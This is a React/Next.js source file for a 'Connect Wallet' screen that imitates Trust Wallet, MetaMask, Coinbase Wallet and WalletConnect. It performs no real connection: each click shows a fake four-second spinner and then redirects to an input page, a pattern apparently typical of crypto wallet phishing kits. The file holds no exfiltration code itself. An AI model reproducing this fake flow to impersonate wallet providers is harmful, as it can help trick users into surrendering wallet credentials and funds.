"use client";
import { images } from "@/constant";
import { useRouter } from "next/navigation";
import Image, { StaticImageData } from "next/image";
import React, { MouseEvent, useState } from "react";

import loading from "../loading";

function walletConnect() {
  const router = useRouter();

  interface Wallet {
    imageUrl: StaticImageData;
    title: string;
  }

  const [isLoading, setIsLoading] = useState(false);

  const handleMetamaskClick = (event: MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      // Navigate to another page with the title from the card clicked
      router.push(`/input-page?title=${encodeURIComponent("Metamask Wallet")}`);
    }, 4000);
    return;
  };

  const handleTrustClick = (event: MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      // Navigate to another page with the title from the card clicked
      router.push(`/input-page?title=${encodeURIComponent("Trust Wallet")}`);
    }, 4000);
    return;
  };

  const handleCoinbaseClick = (event: MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      // Navigate to another page with the title from the card clicked
      router.push(`/input-page?title=${encodeURIComponent("Coinbase Wallet")}`);
    }, 4000);
    return;
  };

  const handleClick = (event: MouseEvent<HTMLDivElement>) => {
    event.preventDefault();
    setIsLoading(false);
    router.push("/otherwallet");
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-transparent">
      <div className="bg-white shadow-lg rounded-lg w-full max-w-md h-96 p-4">
        <h2 className="flex text-xl font-bold mb-4 items-center justify-center">
          Connect Wallet
        </h2>

        <div className="flex items-center bg-gray-200 p-4 mb-4 rounded cursor-pointer"
        onClick={handleTrustClick}>
          <div className="flex-grow text-left">Trust Wallet</div>
          <Image src={images.trustWallet} alt="Logo" className="h-auto w-fit" />
        </div>

        <div className="flex items-center bg-gray-200 p-4 mb-4 rounded cursor-pointer"
        onClick={handleMetamaskClick}>
          <div className="flex-grow text-left">Metamask Wallet</div>
          <Image
            src={images.metaMaskWallet}
            alt="Logo"
            className="h-auto w-fit"
          />
        </div>


        <div className="flex items-center bg-gray-200 p-4 rounded cursor-pointer"
        onClick={handleCoinbaseClick}>
          <div className="flex-grow text-left">CoinBase Wallet</div>
          <Image
            src={images.coinbaseWallet}
            alt="Logo"
            className="h-auto w-fit"
          />
        </div>

        <div
          className="flex items-center bg-gray-200 p-4 mt-4 rounded cursor-pointer"
          onClick={handleClick}
        >
          <div className="flex-grow text-left">WalletConnect</div>
          <Image
            src={images.walletIoWallet}
            alt="Logo"
            className="h-auto w-fit"
          />
        </div>
      </div>

      {isLoading && loading()}
    </div>
  );
}

export default walletConnect;
